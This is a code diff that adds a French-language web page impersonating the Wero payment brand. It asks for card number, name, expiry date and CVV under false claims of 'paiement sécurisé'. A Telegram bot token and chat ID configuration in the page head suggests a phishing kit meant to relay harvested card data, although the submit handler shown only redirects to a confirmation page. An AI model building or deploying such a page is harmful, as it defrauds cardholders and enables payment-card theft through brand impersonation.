@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+    </script>
+            <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wero - Formulaire de paiement par carte</title>
+    
+    <link rel="icon" href="images/icon.png" type="image/png">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --wero-yellow: #FFF69C;
+            --wero-yellow-hover: #fff275;
+            --black: #000000;
+            --white: #ffffff;
+            --gray-light: #F9FAFB;
+            --gray-medium: #E5E7EB;
+            --gray-dark: #374151;
+            --gray-text: #4B5563;
+            --red-asterisk: #D32F2F;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif !important;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--white);
+            color: var(--black);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        a { text-decoration: none; color: inherit; transition: color 0.2s ease-in-out; }
+        button { border: none; background: none; cursor: pointer; font-family: inherit; }
+        img { max-width: 100%; height: auto; display: block; }
+        .hidden { display: none; }
+
+        /* ================= NAVBAR ================= */
+        .header {
+            width: 100%;
+            border-bottom: 1px solid var(--gray-medium);
+            position: relative;
+            background-color: var(--white);
+            z-index: 50;
+        }
+
+        .navbar-container {
+            padding: 1rem 1.25rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.025em;
+            text-transform: uppercase;
+        }
+
+        @media (min-width: 768px) { .navbar-container { padding: 1.25rem 2rem; } }
+
+        .logo-container { z-index: 50; cursor: pointer; }
+        #site-logo { height: 2.2rem; object-fit: contain; }
+        @media (min-width: 768px) { #site-logo { height: 3rem; } }
+
+        #logo-fallback {
+            font-size: 1.25rem;
+            font-weight: 900;
+            letter-spacing: -0.05em;
+            color: var(--black);
+            user-select: none;
+        }
+
+        /* ================= PAGE CONTENT ================= */
+        main {
+            flex: 1;
+            width: 100%;
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 4rem 1.25rem 6rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        @media (min-width: 768px) { main { padding-top: 8rem; padding-bottom: 8rem; } }
+
+        .page-title {
+            font-size: 2rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: -0.05em;
+            color: var(--black);
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        @media (min-width: 768px) { .page-title { font-size: 2.5rem; } }
+
+        .page-subtitle {
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: var(--gray-text);
+            text-align: center;
+            margin-bottom: 3rem;
+            max-width: 600px;
+        }
+
+        .form-container {
+            background-color: var(--wero-yellow);
+            border: 2px solid var(--black);
+            border-radius: 1rem;
+            width: 100%;
+            max-width: 550px;
+            padding: 2.5rem 1.5rem;
+        }
+
+        @media (min-width: 768px) { .form-container { padding: 3rem; } }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            text-align: left;
+            font-size: 0.875rem;
+            font-weight: 700;
+            color: var(--black);
+            margin-bottom: 0.5rem;
+        }
+
+        .asterisk {
+            color: var(--red-asterisk);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 0.875rem;
+            border: 1px solid var(--black);
+            border-radius: 0.5rem;
+            background-color: var(--white);
+            font-family: inherit;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--black);
+            outline: none;
+            transition: box-shadow 0.2s;
+        }
+
+        .form-group input::placeholder {
+            color: #9CA3AF;
+            font-weight: 400;
+        }
+
+        .form-group input:focus {
+            box-shadow: 0 0 0 2px rgba(0,0,0,0.1);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .submit-btn {
+            width: 100%;
+            margin-top: 1.5rem;
+            padding: 1rem;
+            background-color: var(--black);
+            color: var(--white);
+            border: 2px solid var(--black);
+            border-radius: 9999px;
+            font-size: 0.875rem;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #333;
+        }
+
+        .submit-btn:active {
+            transform: translateY(1px);
+        }
+
+        /* ================= FOOTER ================= */
+        .site-footer {
+            background-color: var(--wero-yellow);
+            color: var(--black);
+            padding: 4rem 1.25rem 2rem;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        .site-footer-inner {
+            max-width: 1280px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        @media (min-width: 768px) { .site-footer { padding: 6rem 4rem 2rem; } }
+
+        .footer-content {
+            margin-bottom: 3rem;
+        }
+
+        .footer-title {
+            font-size: 1.5rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: -0.05em;
+            margin-bottom: 1rem;
+        }
+
+        .footer-link {
+            display: inline-block;
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: var(--black);
+            text-decoration: underline;
+            text-underline-offset: 4px;
+            margin-top: 1rem;
+        }
+    
+        /* ===== OPTIMISATIONS MOBILE ===== */
+        * {
+            box-sizing: border-box;
+        }
+        
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+        
+        /* Responsive images */
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        /* Responsive text */
+        @media (max-width: 768px) {
+            body {
+                font-size: 14px;
+                line-height: 1.5;
+            }
+            
+            h1, .h1 { font-size: 20px !important; }
+            h2, .h2 { font-size: 18px !important; }
+            h3, .h3 { font-size: 16px !important; }
+            
+            /* Buttons */
+            button, .btn, [class*="btn"] {
+                min-height: 44px;
+                padding: 12px 20px !important;
+                font-size: 14px;
+            }
+            
+            /* Inputs */
+            input, select, textarea {
+                min-height: 44px;
+                padding: 12px;
+                font-size: 16px;
+            }
+            
+            /* Layout */
+            .container, main, section {
+                padding: 15px !important;
+            }
+            
+            /* Grid adjustments */
+            [class*="grid"], [class*="flex"] {
+                flex-direction: column;
+            }
+            
+            /* Hide unnecessary elements */
+            .hide-mobile {
+                display: none !important;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1, .h1 { font-size: 18px !important; }
+            h2, .h2 { font-size: 16px !important; }
+            h3, .h3 { font-size: 14px !important; }
+            
+            button, .btn, [class*="btn"] {
+                width: 100%;
+                padding: 14px 16px !important;
+                font-size: 13px;
+            }
+            
+            input, select, textarea {
+                font-size: 16px;
+            }
+            
+            .container, main, section {
+                padding: 10px !important;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="navbar-container">
+            <div class="logo-container" onclick="window.location.href='index.html'">
+                <img id="site-logo" src="images/wero.jpg" alt="Wero" class="hidden">
+                <span id="logo-fallback">wero</span>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <h1 class="page-title">PAIEMENT PAR CARTE</h1>
+        <p class="page-subtitle">Entrez les informations de votre carte de credit pour finaliser votre inscription.</p>
+
+        <div class="form-container">
+            <form id="cardForm" onsubmit="handleCardSubmit(event)">
+                
+                <div class="form-group">
+                    <label>Numero de carte <span class="asterisk">*</span></label>
+                    <input type="text" id="cardNumber" placeholder="4111 1111 1111 1111" maxlength="19" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Nom sur la carte <span class="asterisk">*</span></label>
+                    <input type="text" id="cardName" placeholder="Jean Dupont" required>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Date d'expiration <span class="asterisk">*</span></label>
+                        <input type="text" id="expiry" placeholder="MM/AA" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV <span class="asterisk">*</span></label>
+                        <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-btn">Payer et confirmer</button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <div class="site-footer-inner">
+            <div class="footer-content">
+                <h3 class="footer-title">Paiement Securise</h3>
+                <p style="color: var(--black); margin-bottom: 1rem;">
+                    Votre paiement est protege par SSL 256-bit.
+                </p>
+                <a href="index.html" class="footer-link">Retour a l'accueil</a>
+            </div>
+            
+            <div style="border-top: 2px solid var(--black); padding-top: 2rem;">
+                <p style="font-size: 0.85rem; color: var(--black);">
+                    © 2026 EPI Company SE - Tous droits reserves
+                </p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+
+// Attendre config.js
+async function waitForConfig(maxWait = 3000) {
+    const start = Date.now();
+    while (!window.telegramConfig && Date.now() - start < maxWait) {
+        await new Promise(r => setTimeout(r, 50));
+    }
+    return window.telegramConfig;
+}
+
+
+        document.addEventListener("DOMContentLoaded", async () => { await waitForConfig();
+            const logoImg = document.getElementById("site-logo");
+            const logoFallback = document.getElementById("logo-fallback");
+
+            if (logoImg) {
+                const testImg = new Image();
+                testImg.src = logoImg.src;
+                testImg.onload = () => {
+                    logoImg.classList.remove("hidden");
+                    logoFallback.classList.add("hidden");
+                };
+                testImg.onerror = () => {
+                    logoImg.classList.add("hidden");
+                    logoFallback.classList.remove("hidden");
+                };
+            }
+
+            const cardNumber = document.getElementById('cardNumber');
+            const expiry = document.getElementById('expiry');
+            const cvv = document.getElementById('cvv');
+
+            cardNumber.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+                let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+                e.target.value = formatted;
+            });
+
+            expiry.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                e.target.value = value;
+            });
+
+            cvv.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+        });
+
+        function handleCardSubmit(event) {
+            event.preventDefault();
+            window.location.href = 'confirmation.html';
+        }
+    </script>
+</body>
+</html>
+
